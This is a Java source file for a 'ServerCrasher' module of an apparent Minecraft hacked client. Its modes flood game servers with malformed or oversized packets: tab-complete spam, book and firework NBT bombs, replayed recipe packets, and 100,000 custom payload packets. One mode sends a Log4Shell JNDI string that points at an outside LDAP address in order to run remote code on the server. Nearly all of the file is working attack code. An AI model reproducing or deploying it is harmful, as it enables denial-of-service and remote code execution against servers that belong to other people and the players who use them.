package zyx.existent.module.modules.misc;

import java.util.Arrays;
import java.util.Random;

import org.apache.commons.lang3.RandomUtils;

import io.netty.buffer.Unpooled;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.play.client.CPacketPlaceRecipe;
import net.minecraft.network.play.client.CPacketTabComplete;
import net.minecraft.network.play.server.SPacketDisconnect;
import net.minecraft.network.play.server.SPacketJoinGame;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import zyx.existent.Existent;
import zyx.existent.event.EventTarget;
import zyx.existent.event.events.EventPacket;
import zyx.existent.event.events.EventUpdate;
import zyx.existent.module.Category;
import zyx.existent.module.Module;
import zyx.existent.module.data.Options;
import zyx.existent.module.data.Setting;
import zyx.existent.utils.ChatUtils;
import zyx.existent.utils.misc.MiscUtils;

public class ServerCrasher extends Module {
    private String MODE = "MODE";
    private String PACKET = "PACKET";
    private String DISABLE = "AUTODISABLE";
    private int int0;
    private Boolean flag;

    ItemStack firework = null;

    private CPacketPlaceRecipe recp = null;
    private CPacketPlaceRecipe recp2 = null;
    private CPacketPlaceRecipe recp3 = null;

    public ServerCrasher(String name, String desc, int keybind, Category category) {
        super(name, desc, keybind, category);

        settings.put(MODE, new Setting<>(MODE, new Options("Mode", "Infinity", new String[]{"Infinity", "TabComplete", "Payload", "Bookflood", "Payload2", "Test", "Test2"}), "Crasher method"));
        settings.put(PACKET, new Setting<>(PACKET, 100.0, "Packet Size", 0.1, 1.0, 10000.0));
        settings.put(DISABLE, new Setting<>(DISABLE, true, "AutoDisable."));
    }
    @Override
    public void onDisable() {
    	flag = false;
    	int0 = 0;
    	super.onDisable();
    }
    @Override
    public void onEnable() {
        String currentmode = ((Options) settings.get(MODE).getValue()).getSelected();

        switch (currentmode) {
            case "Test":
                // Autumn
                PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
                packetbuffer.writeLong(Long.MAX_VALUE);
                for (int i = 0; i < 100000; i++)
                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|AdvCdm", packetbuffer));
                break;
            case "Test2":
                this.firework = null;
                this.firework = new ItemStack(Items.FIREWORKS);
                final NBTTagCompound tagCompound = new NBTTagCompound();
                final NBTTagCompound nbtTagCompound = new NBTTagCompound();
                final NBTTagList list = new NBTTagList();
                final int[] array = new int[64];
                for (int i = 0; i < 3260; ++i) {
                    Arrays.fill(array, i + 1);
                    final NBTTagCompound nbtTagCompound2 = new NBTTagCompound();
                    nbtTagCompound2.setIntArray("Colors", array);
                    list.appendTag(nbtTagCompound2);
                }
                nbtTagCompound.setTag("Explosions", list);
                nbtTagCompound.setByte("Flight", (byte)2);
                tagCompound.setTag("Fireworks", nbtTagCompound);
                this.firework.setTagCompound(tagCompound);
                break;
        }
        super.onEnable();
    }

    @EventTarget
    public void onUpdate(EventUpdate eventUpdate) {
        String currentmode = ((Options) settings.get(MODE).getValue()).getSelected();

        switch (currentmode) {
            case "Infinity":
            	for (int i = 0; i < ((Number) settings.get(PACKET).getValue()).doubleValue(); i++) {
            	mc.getConnection().sendPacket(new CPacketAnimation(EnumHand.MAIN_HAND));
            	}
//                mc.getConnection().sendPacket(new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
//                mc.getConnection().sendPacket(new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, (new Random()).nextBoolean()));
                break;
            case "TabComplete":
                for (int i = 0; i < ((Number) settings.get(PACKET).getValue()).doubleValue(); i++) {
                    double rand1 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
                    double rand2 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
                    double rand3 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
                    mc.getConnection().sendPacket(new CPacketTabComplete("Ã–Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃ–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’ÃžÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\\\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž", new BlockPos(rand1, rand2, rand3), true));
                }
                break;
            case "Payload":
            	if (flag) {
               	flag = false;
               	for (int i = 0; i < ((Number) settings.get(PACKET).getValue()).doubleValue(); i++) {
                	mc.getConnection().sendPacket(recp);
                	mc.getConnection().sendPacket(recp2);
                	mc.getConnection().sendPacket(recp3);
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|Brand", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BOpen", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|TrList", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|TrSel", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BEdit", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
//                    mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BSign", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ã–ÃƒÃ�Ã�?Â½Â¼uÂ§}e>?\"Ã¨Ã«Ã½Ã¼Ã¹ÃµÃ·Ã¥Ã¢Ã�Å¾Å¸Æ’Ãž")));
                }
            	}
                break;
            case "Bookflood":
                final ItemStack bookStack = new ItemStack(Items.WRITABLE_BOOK);
                final NBTTagCompound bookCompound = new NBTTagCompound();

                bookCompound.setString("author", MiscUtils.randomNumber(20));
                bookCompound.setString("title", MiscUtils.randomNumber(20));

                final NBTTagList pageList = new NBTTagList();
                final String pageText = MiscUtils.randomNumber(600);

                for (int page = 0; page < 50; page++) {
                    pageList.appendTag(new NBTTagString(pageText));
                }

                bookCompound.setTag("pages", pageList);
                bookStack.setTagCompound(bookCompound);

                for (int packets = 0; packets < 100; packets++) {
                    final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                    packetBuffer.writeItemStackToBuffer(bookStack);
                    mc.getConnection().sendPacket(new CPacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
                }
                break;
            case "Payload2":
                new Thread(new Runnable() {
                    public final int packets = 10;

                    @Override
                    public void run() {
                        try {
                            NBTTagList bookPages = new NBTTagList();
                            for (int i = 0; i < 16300; ++i) {
                                bookPages.appendTag(new NBTTagString(""));
                            }
                            for (int j = 0; j < this.packets; ++j) {
                                final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
                                itemStack.setTagInfo("pages", bookPages);
                                final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                                packetBuffer.writeItemStackToBuffer(itemStack);
                                mc.getConnection().sendPacket(new CPacketCustomPayload("MC|BEdit", packetBuffer));
                            }
                        } catch (Exception ignored) {
                            ;
                        }
                    }
                }).start();
                break;
            case "Test2":
            	mc.getConnection().sendPacket(new CPacketTabComplete("${jndi:ldap://125.194.85.34:1389/Run}"));
            	ChatUtils.printChat("a");
//                (new Thread(() -> {
//                    for (byte b = 0; b < 20; b++) {
//                        mc.getConnection().sendPacket(new CPacketPlayerTryUseItemOnBlock(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2.0D, mc.thePlayer.posZ), EnumFacing.UP, EnumHand.MAIN_HAND, 0.0F, 0.0F, 0.0F));
//                    }
//                })).start();
                break;
        }
    }
    @EventTarget
    public void onPacket(EventPacket event) {
        switch (((Options) settings.get(MODE).getValue()).getSelected()) {
            case "Payload":
            	if(event.getPacket() instanceof CPacketPlaceRecipe&&event.isOutgoing()) {
                    CPacketPlaceRecipe p1 = (CPacketPlaceRecipe)event.getPacket();
                    if(int0 == 0) {
                        recp = p1;
                        ChatUtils.printChat("1");
                    }
                    if(int0 == 1) {
                        recp2 = p1;
                        ChatUtils.printChat("2");
                    }
                    if(int0 == 2) {
                    	ChatUtils.printChat("3");
                        recp3 = p1;
                        flag = true;
                    }
                    int0++;
                }
//                if (event.getPacket() instanceof CPacketCustomPayload) {
//                    CPacketCustomPayload C17 = (CPacketCustomPayload) event.getPacket();
//                    C17.channel = "MC|Brand";
//                    C17.data = (new PacketBuffer(Unpooled.buffer())).writeString("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
//                }
                break;
        }

        if ((Boolean) settings.get(DISABLE).getValue() && Existent.getModuleManager().isEnabled(this.getClass())) {
            if (event.getPacket() instanceof SPacketJoinGame) {
                toggle();
            }
            if (event.getPacket() instanceof SPacketDisconnect) {
                toggle();
            }
        }
    }
}
